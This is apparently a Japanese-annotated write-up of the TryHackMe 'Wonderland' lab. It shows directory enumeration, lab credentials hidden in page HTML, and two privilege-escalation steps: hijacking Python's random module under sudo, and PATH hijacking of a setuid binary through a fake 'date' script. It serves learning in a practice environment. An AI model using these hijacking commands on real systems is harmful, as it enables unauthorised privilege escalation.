# TryHackMe - Wonderland
[https://tryhackme.com/room/wonderland](https://tryhackme.com/room/wonderland)

## Target Info
- IP: 10.10.178.220
- OS: 

## 1. Enumeration

### nmap

```
sudo nmap -sV -O 10.10.178.220

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)

```

## 80port

```
Follow the White Rabbit.
"Curiouser and curiouser!" cried Alice (she was so much surprised, that for the moment she quite forgot how to speak good English)

```

- 内容にヒントはなささおう
- http://10.10.178.220/img/white_rabbit_1.jpg のリンク発見

## gobuster 

```
gobuster dir -u http://10.10.178.220 -w common.txt http
/img                  (Status: 301) [Size: 0] [--> img/]
/index.html           (Status: 301) [Size: 0] [--> ./]
/r                    (Status: 301) [Size: 0] [--> r/]
```

### /img
- 画像ファイルを発見
- めっちゃ重い

### /r

```
Keep Going.
"Would you tell me, please, which way I ought to go from here?"
```
- ディレクトリなのでここから探索できそう


```
gobuster dir -u http://10.10.178.220/r -w common.txt http

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/a                    (Status: 301) [Size: 0] [--> a/]
/index.html           (Status: 301) [Size: 0] [--> ./]
```

### /r/a

```
Keep Going.
"That depends a good deal on where you want to get to," said the Cat.
```

```
gobuster dir -u http://10.10.178.220/r/a -w common.txt http
Keep Going.
"I don’t much care where—" said Alice.
```

### /r/a/b

```
Keep Going.
"I don’t much care where—" said Alice.
```

```
gobuster dir -u http://10.10.178.220/r/a/b -w common.txt http

Starting gobuster in directory enumeration mode
===============================================================
/b                    (Status: 301) [Size: 0] [--> b/]
/index.html           (Status: 301) [Size: 0] [--> ./]
```

### /r/a/b/b

```
Keep Going.
"Then it doesn’t matter which way you go," said the Cat.
```

```
gobuster dir -u http://10.10.178.220/r/a/b/b -w common.txt http

Starting gobuster in directory enumeration mode
===============================================================
/i                    (Status: 301) [Size: 0] [--> b/]
/index.html           (Status: 301) [Size: 0] [--> ./]
```

### /r/a/b/b/i

```
Keep Going.
"—so long as I get somewhere,"" Alice added as an explanation.
```

```
gobuster dir -u http://10.10.178.220/r/a/b/b/i -w common.txt http

Starting gobuster in directory enumeration mode
===============================================================
/t                   (Status: 301) [Size: 0] [--> b/]
/index.html           (Status: 301) [Size: 0] [--> ./]
```

### /r/a/b/b/i/t/

```
Open the door and enter wonderland
"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."

Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"

"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving the other paw, "lives a March Hare. Visit either you like: they’re both mad."
```

```
gobuster dir -u http://10.10.178.220/r/a/b/b/t -w common.txt http

Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 301) [Size: 0] [--> ./]
```

- ここまでで他はなさそう
- htmlを調べたところ

```
<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
    <img src="/img/alice_door.png" style="height: 50rem;">
```

- これを発見
- ユーザ名とパスワードっぽい

## ssh
- ssh alice@10.10.178.220
- ログインは成功。ユーザは何人かいるけどcdできない

## 2. Privilege Escalation

### alice
- sudo -l

```
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
- rabbitユーザでwalrus_and_the_carpenter.pyの実行できる
- walrus_and_the_carpenter.pyの中身を確認するとimport randomをしてる
- random.pyの中のコードを実行できそう

```
random.py

import os
os.system("/bin/bash")
```
- walrus_and_the_carpenter.pyを実行
- sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
- rabbitに昇格成功


### rabbit

```
ls -la
total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
drwxr-xr-x 6 root   root    4096 May 25  2020 ..
lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
```
- teaPartyはsなので、rootでの実行が可能
- ./teaPartyで実行してみる

```
./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Sat, 07 Jun 2025 09:41:05 +0000
Ask very nicely, and I will give you some tea while you wait for him
```
- 何か入力を待って、何か返してくれるらしい


```
ltrace ./teaParty
setuid(1003)                                                     = -1
setgid(1003)                                                     = -1
puts("Welcome to the tea party!\nThe Ma"...Welcome to the tea party!
The Mad Hatter will be here soon.
)                     = 60
system("/bin/echo -n 'Probably by ' && d"...Probably by Sat, 07 Jun 2025 09:47:38 +0000
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                           = 0
puts("Ask very nicely, and I will give"...Ask very nicely, and I will give you some tea while you wait for him
)                      = 69
getchar(1, 0x558ffba5d260, 0x7f62572188c0, 0x7f6256f3b154
)       = 10
puts("Segmentation fault (core dumped)"...Segmentation fault (core dumped)
)                      = 33
+++ exited (status 33) +++
```
- 呼び出される関数とかを確認
- date -l が実行されている
- 絶対パスではなく相対ぱすでコマンド探してるので、つまりdateコマンドにbashの起動コマンドとか入れて置いておけば、root権限での実行が可能
- 

```
echo "/bin/bash" > date
chmod +x date
export PATH=.:$PATH
./teaParty
```
- bashの起動コマンドを記載したdateファイルを作成
- dateに実行権限追加
- PATHを変更。カレントディレクトリのdateが優先されるように変更する
- 再度実行
- 見事hatterの権限奪取成功

### hatter

- パスワードファイルを確認
- WhyIsARavenLikeAWritingDesk?

### user.txt

- /rootにcdできたのでcat user.txtで取得完了


```
file teaParty 
teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped

```



## 4. Flags
